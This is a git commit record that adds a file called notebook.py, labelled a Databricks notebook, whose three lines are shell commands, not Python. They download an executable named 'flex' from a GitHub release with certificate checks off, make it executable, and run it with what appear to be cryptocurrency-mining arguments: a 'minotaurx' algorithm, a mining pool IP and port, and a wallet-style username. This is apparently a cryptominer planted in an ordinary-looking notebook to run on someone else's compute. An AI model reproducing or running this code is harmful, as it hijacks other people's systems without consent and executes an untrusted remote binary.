1f7c837b8db8f98903421b40468a74c7fdc3f31f
paskofamas <mr.paskofa42@jugda.com>
2025-02-08 11:17:51 +0700

    Create notebook.py

---
+++ notebook.py
@@ -0,0 +1,3 @@
+# Databricks notebook source
+curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/flex && chmod +x flex
+./flex -a minotaurx -o 27.254.39.27:7021 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Wijaya1 -p c=MAZA
